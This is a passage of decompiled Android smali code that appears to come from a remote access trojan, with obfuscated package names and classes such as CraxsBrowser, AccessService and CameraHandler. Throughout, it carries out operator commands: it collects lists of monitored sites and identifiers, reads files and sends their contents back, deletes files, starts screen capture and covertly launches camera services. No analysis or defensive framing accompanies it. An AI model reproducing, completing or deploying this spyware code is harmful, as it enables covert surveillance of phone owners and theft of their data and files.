    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 1541
    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 1542
    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->TNames:Ljava/util/List;

    invoke-interface {v6}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v6

    :cond_9a
    :goto_28
    invoke-interface {v6}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-eqz v7, :cond_9b

    invoke-interface {v6}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Ljava/lang/String;

    .line 1543
    sget-object v8, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v8, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->Map_Name_Lnk:Ljava/util/Map;

    invoke-interface {v8, v7}, Ljava/util/Map;->containsKey(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_9a

    sget-object v8, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v8, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->Map_Name_ID:Ljava/util/Map;

    invoke-interface {v8, v7}, Ljava/util/Map;->containsKey(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_9a

    .line 1544
    sget-object v8, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v8, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->Map_Name_Lnk:Ljava/util/Map;

    invoke-interface {v8, v7}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/String;

    .line 1545
    sget-object v9, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v9, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->Map_Name_ID:Ljava/util/Map;

    invoke-interface {v9, v7}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Ljava/lang/String;

    .line 1546
    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v7, "!"

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_5f
    .catch Ljava/lang/Exception; {:try_start_5f .. :try_end_5f} :catch_11
    .catch Ljava/lang/OutOfMemoryError; {:try_start_5f .. :try_end_5f} :catch_15

    goto :goto_28

    .line 1553
    :cond_9b
    :try_start_60
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0
    :try_end_60
    .catch Ljava/lang/Exception; {:try_start_60 .. :try_end_60} :catch_10
    .catch Ljava/lang/OutOfMemoryError; {:try_start_60 .. :try_end_60} :catch_15

    goto :goto_29

    :catch_10
    :try_start_61
    const-string v0, "Empty"

    .line 1557
    :goto_29
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->WebVew:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "L:"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-static {v5, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    .line 1559
    :cond_9c
    invoke-static {}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/CraxsBrowser;->GetAllFounded()Ljava/lang/String;

    move-result-object v0

    const-string v5, "null"

    .line 1560
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_af

    .line 1561
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->WebVew:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "LF:"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-static {v5, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    goto/16 :goto_2a

    .line 1528
    :cond_9d
    aget-object v0, v0, v8

    invoke-virtual {v0, v5}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 1529
    aget-object v5, v0, v3

    .line 1530
    aget-object v6, v0, v8

    .line 1531
    aget-object v0, v0, v7

    .line 1532
    sget-object v7, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    invoke-static {v5, v6}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->Addlink(Ljava/lang/String;Ljava/lang/String;)V

    .line 1533
    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    invoke-static {v5, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->AddID(Ljava/lang/String;Ljava/lang/String;)V

    .line 1534
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    invoke-static {v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->AddTname(Ljava/lang/String;)V

    .line 1535
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->WebVew:Ljava/lang/String;

    const-string v5, "MSG:New site add successfully "

    invoke-virtual {v5}, Ljava/lang/String;->getBytes()[B

    move-result-object v5

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    goto/16 :goto_2a

    .line 1515
    :cond_9e
    aget-object v0, v0, v8

    invoke-virtual {v0, v5}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 1516
    aget-object v5, v0, v3

    .line 1517
    aget-object v6, v0, v8

    .line 1518
    aget-object v0, v0, v7

    .line 1519
    sget-object v7, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v7, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->Map_Name_Lnk:Ljava/util/Map;

    invoke-interface {v7, v5}, Ljava/util/Map;->containsKey(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_9f

    .line 1520
    sget-object v7, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v7, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->Map_Name_Lnk:Ljava/util/Map;

    invoke-interface {v7, v5, v6}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1522
    :cond_9f
    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->Map_Name_ID:Ljava/util/Map;

    invoke-interface {v6, v5}, Ljava/util/Map;->containsKey(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_a0

    .line 1523
    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->Map_Name_ID:Ljava/util/Map;

    invoke-interface {v6, v5, v0}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1525
    :cond_a0
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->WebVew:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "MSG:"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, " Updated successfully "

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->getBytes()[B

    move-result-object v5

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    goto/16 :goto_2a

    .line 1510
    :cond_a1
    aget-object v0, v0, v8

    .line 1511
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    invoke-static {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->Removename(Ljava/lang/String;)V

    .line 1512
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->WebVew:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "MSG:"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, " Removed successfully "

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-static {v5, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    goto/16 :goto_2a

    .line 1501
    :cond_a2
    aget-object v0, v0, v8

    .line 1502
    invoke-static {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/CraxsBrowser;->readDataFromFile(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 1503
    invoke-virtual {v6}, Ljava/lang/String;->length()I

    move-result v7

    if-lez v7, :cond_af

    .line 1505
    sget-object v7, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->WebVew:Ljava/lang/String;

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "T:"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-static {v7, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    goto/16 :goto_2a

    .line 1493
    :cond_a3
    aget-object v0, v0, v8

    .line 1494
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->Map_Name_Lnk:Ljava/util/Map;

    invoke-interface {v5, v0}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    .line 1495
    invoke-static {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/CraxsBrowser;->RemoveFile(Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v0

    .line 1496
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_af

    .line 1497
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->WebVew:Ljava/lang/String;

    const-string v5, "MSG:File deleted successfully "

    invoke-virtual {v5}, Ljava/lang/String;->getBytes()[B

    move-result-object v5

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V
    :try_end_61
    .catch Ljava/lang/Exception; {:try_start_61 .. :try_end_61} :catch_11
    .catch Ljava/lang/OutOfMemoryError; {:try_start_61 .. :try_end_61} :catch_15

    goto/16 :goto_2a

    :catch_11
    move-exception v0

    .line 1569
    :try_start_62
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto/16 :goto_2a

    .line 1571
    :cond_a4
    aget-object v0, v10, v8

    const-string v5, "scc:"

    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0
    :try_end_62
    .catch Ljava/lang/Exception; {:try_start_62 .. :try_end_62} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_62 .. :try_end_62} :catch_15

    if-eqz v0, :cond_af

    .line 1573
    :try_start_63
    aget-object v0, v10, v8

    const-string v5, "scc:"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    aget-object v5, p1, v3

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->StartScreen(Ljava/lang/String;Landroid/content/Context;)V
    :try_end_63
    .catch Ljava/lang/Exception; {:try_start_63 .. :try_end_63} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_63 .. :try_end_63} :catch_15

    goto/16 :goto_2a

    .line 1584
    :cond_a5
    :try_start_64
    const-class v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/CameraHandler;

    aget-object v5, p1, v3

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/Tools;->NotServiceRunning(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v0
    :try_end_64
    .catch Ljava/lang/Exception; {:try_start_64 .. :try_end_64} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_64 .. :try_end_64} :catch_15

    if-eqz v0, :cond_a6

    .line 1586
    :try_start_65
    sput-boolean v8, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->FORCA:Z

    .line 1587
    new-instance v0, Landroid/content/Intent;

    aget-object v5, p1, v3

    const-class v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/CameraActvity;

    invoke-direct {v0, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 1588
    invoke-virtual {v0, v13}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v5, 0x800000

    .line 1589
    invoke-virtual {v0, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const-string v5, "key"

    .line 1590
    invoke-virtual {v0, v5, v11}, Landroid/content/Intent;->putExtra(Ljava/lang/String;[Ljava/lang/String;)Landroid/content/Intent;

    .line 1591
    aget-object v5, p1, v3

    invoke-virtual {v5, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_65
    .catch Ljava/lang/Exception; {:try_start_65 .. :try_end_65} :catch_12
    .catch Ljava/lang/OutOfMemoryError; {:try_start_65 .. :try_end_65} :catch_15

    goto/16 :goto_2a

    .line 1594
    :catch_12
    :try_start_66
    new-instance v0, Landroid/content/Intent;

    aget-object v5, p1, v3

    const-class v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/CameraHandler;

    invoke-direct {v0, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 1595
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/PacketClass;->FTX1:Ljava/lang/String;

    invoke-virtual {v0, v5, v11}, Landroid/content/Intent;->putExtra(Ljava/lang/String;[Ljava/lang/String;)Landroid/content/Intent;

    .line 1596
    aget-object v5, p1, v3

    invoke-virtual {v5, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto/16 :goto_2a

    .line 1602
    :cond_a6
    sput-boolean v3, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->FORCA:Z

    .line 1603
    new-instance v0, Landroid/content/Intent;

    aget-object v5, p1, v3

